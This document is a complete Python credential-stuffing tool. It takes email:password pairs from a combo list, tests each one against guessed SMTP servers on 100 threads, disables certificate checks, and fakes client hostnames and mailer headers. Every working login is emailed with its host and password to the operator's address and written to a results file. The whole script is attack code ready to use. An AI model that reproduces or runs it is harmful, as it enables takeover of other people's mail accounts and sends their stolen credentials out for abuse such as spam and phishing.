import os
import smtplib
import ssl
import threading
import re
import socket
import random
import time
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init

# Initialize colorama correctly for all terminals
init(autoreset=True)

MY_RECEIVER_EMAIL = "ID_your"

# Thread synchronization locks
file_lock = threading.Lock()
print_lock = threading.Lock()

HUMAN_HOSTNAMES = [
    "localhost", "outlook.com", "://gmail.com", "sendgrid.net", 
    "yahoo.com", "workstation.local", "://gmail.com", 
    "desktop-client.net", "mxs.mail.ru", "office365.com"
]

def URLdomain(url):
    try:
        domain = url.strip().replace("http://", "").replace("https://", "").replace("www.", "")
        if "/" in domain:
            domain = domain.split("/")[0]
        return domain
    except Exception:
        return url

def parse_combo(line):
    cleaned = line.strip()
    if not cleaned:
        return None
    
    # Normalize potential delimiters
    normalized = cleaned.replace(':', '|').replace(';', '|')
    parts = [p.strip() for p in normalized.split('|') if p.strip()]
    
    # Format Type A: host|port|email|password
    if len(parts) >= 4 and any("@" in p for p in parts):
        try:
            email_idx = [i for i, p in enumerate(parts) if "@" in p][0]
            if email_idx >= 2:
                return {
                    "email": parts[email_idx],
                    "pwd": parts[email_idx + 1] if email_idx + 1 < len(parts) else parts[-1],
                    "custom_host": parts[0],
                    "custom_port": parts[1]
                }
        except IndexError:
            pass
            
    # Format Type B: email|password
    email_match = re.search(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', cleaned)
    if not email_match:
        return None
        
    email = email_match.group(0)
    try:
        remainder = cleaned.split(email)[1].strip()
    except IndexError:
        return None
        
    if remainder.startswith(':') or remainder.startswith('|') or remainder.startswith(';'):
        pwd = remainder[1:].strip()
    else:
        pwd = remainder.strip()
        
    if email and pwd:
        return {
            "email": email,
            "pwd": pwd,
            "custom_host": None,
            "custom_port": None
        }
    return None

def fast_port_check(host, port, timeout=1.0):
    """Instantly drops blocked firewall targets to prevent thread starvation."""
    try:
        sock = socket.create_connection((host, int(port)), timeout=timeout)
        sock.close()
        return True
    except Exception:
        return False

def log_to_file(filename, data):
    """Thread-safe safe appending to result tracking arrays."""
    with file_lock:
        try:
            with open(filename, 'a', encoding='utf-8', errors='ignore') as file:
                file.write(data + '\n')
        except Exception:
            pass

def SMTP_Worker(line):
    try:
        parsed = parse_combo(line)
        if not parsed:
            return
            
        email = parsed["email"]
        pwd = parsed["pwd"]
        
        try:
            domain_part = email.split('@')[1]
            base_domain = URLdomain(domain_part)
        except IndexError:
            return
        
        # Build priority host targeting structure
        if parsed["custom_host"] and parsed["custom_port"]:
            hosts_to_try = [parsed["custom_host"], base_domain, f"mail.{base_domain}", f"smtp.{base_domain}"]
            ports = [parsed["custom_port"], '587', '25', '465']
        else:
            hosts_to_try = [base_domain, f"mail.{base_domain}", f"smtp.{base_domain}"]
            ports = ['587', '25', '465']
            
        hosts_to_try = list(dict.fromkeys(hosts_to_try))
        ports = list(dict.fromkeys(ports))
        
        success = False
        time.sleep(random.uniform(0.02, 0.1)) # Anti-clustering sleep
        
        for host in hosts_to_try:
            if success:
                break
                
            for port in ports:
                # Pre-flight check avoids socket starvation and script hanging
                if not fast_port_check(host, port, timeout=1.0):
                    continue
                    
                server = None
                try:
                    random_agent = random.choice(HUMAN_HOSTNAMES)
                    
                    # Connection protocol switching
                    if port == '465':
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        server = smtplib.SMTP_SSL(host, int(port), local_hostname=random_agent, timeout=2.0, context=context)
                    else:
                        server = smtplib.SMTP(host, int(port), local_hostname=random_agent, timeout=2.0)
                        try:
                            server.ehlo(random_agent)
                        except Exception:
                            try: server.helo(random_agent)
                            except Exception: pass
                            
                        if server.has_extn('STARTTLS'):
                            context = ssl.create_default_context()
                            context.check_hostname = False
                            context.verify_mode = ssl.CERT_NONE
                            try:
                                server.starttls(context=context)
                                server.ehlo(random_agent)
                            except Exception:
                                continue

                    # Attempt Authentication
                    server.login(email, pwd)
                    
                    # Outbound Delivery Validation Sequence
                    send_verified = False
                    try:
                        headers = f"From: <{email}>\r\n"
                        headers += f"To: {MY_RECEIVER_EMAIL}\r\n"
                        headers += f"Reply-To: {MY_RECEIVER_EMAIL}\r\n"
                        headers += f"Subject: 101% SMTP Live: {host}:{port}\r\n"
                        headers += "MIME-Version: 1.0\r\n"
                        headers += "Content-Transfer-encoding: 8bit\r\n"
                        headers += f"Return-Path: {email}\r\n"
                        headers += "X-Priority: 1\r\n"
                        headers += "X-MSmail-Priority: High\r\n"
                        headers += "X-Mailer: Microsoft Office Outlook, Build 11.0.5510\r\n\r\n"
                        headers += f"Host: {host}:{port}\r\nUser: {email}\r\nPass: {pwd}\r\n"
                        
                        rejected = server.sendmail(email, MY_RECEIVER_EMAIL, headers.encode('utf-8'))
                        if not rejected:
                            send_verified = True
                    except Exception:
                        send_verified = False

                    if send_verified:
                        smtp_result = f"{host}|{port}|{email}|{pwd}"
                        log_to_file('SMTPs.txt', smtp_result)
                                
                        with print_lock:
                            print(f"{Fore.GREEN}[SUCCESS] Live Transmission -> {smtp_result}")
                            
                        success = True
                        try: server.quit()
                        except Exception: pass
                        break
                    else:
                        with print_lock:
                            print(f"{Fore.YELLOW}[RESTRICTED] Login OK but Outbound Blocked: {email}")
                        try: server.quit()
                        except Exception: pass
                        
                except smtplib.SMTPAuthenticationError:
                    with print_lock:
                        print(f"{Fore.RED}[BAD REFS] Invalid Auth: {email}")
                    # Account rejected explicitly by server. Skip other ports to save time.
                    success = False
                    break  
                except (smtplib.SMTPConnectError, socket.timeout, ssl.SSLError):
                    # Connection broken mid-stream or protocol mismatch
                    pass
                except Exception:
                    pass
                finally:
                    if server:
                        try: server.close()
                        except Exception: pass
                        
        if not success:
            log_to_file('failed_accounts.txt', f"{email}|{pwd}")
                
    except Exception:
        pass

def main():
    print(f"{Fore.CYAN}==================================================")
    print(f"{Fore.CYAN}=== 101% HIGH-SPEED LIVE TRANSMISSION VAL-v2 ===")
    print(f"{Fore.CYAN}==================================================")
    
    input_file = "combo.txt"
    max_workers = 100  # Elevated worker performance profile for fast systems
    
    if not os.path.exists(input_file):
        with print_lock:
            print(f"{Fore.RED}[CRITICAL] Target configuration path '{input_file}' not found.")
        return
        
    try:
        with open(input_file, "r", encoding="utf-8", errors="ignore") as f:
            lines = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Error loading source file: {e}")
        return
        
    if not lines:
        print(f"{Fore.YELLOW}[ABORT] No entries identified inside target execution matrix.")
        return
        
    # Deduplicate checking array on memory load
    initial_count = len(lines)
    lines = list(dict.fromkeys(lines))
    deduped_count = len(lines)
    
    with print_lock:
        print(f"{Fore.BLUE}[SYSTEM] Loaded {initial_count} lines. (Cleaned {initial_count - deduped_count} duplicates).")
        print(f"{Fore.BLUE}[SYSTEM] Initializing asynchronous transmission array utilizing {max_workers} worker threads...")
    try:
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            executor.map(SMTP_Worker, lines)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[HALT] Execution interrupted by manual operator command.")
        return

    with print_lock:
        print(f"{Fore.CYAN}=== Operational Sequence Finalized. Clean Outputs Maintained ===")

if __name__ == "__main__":
    main()
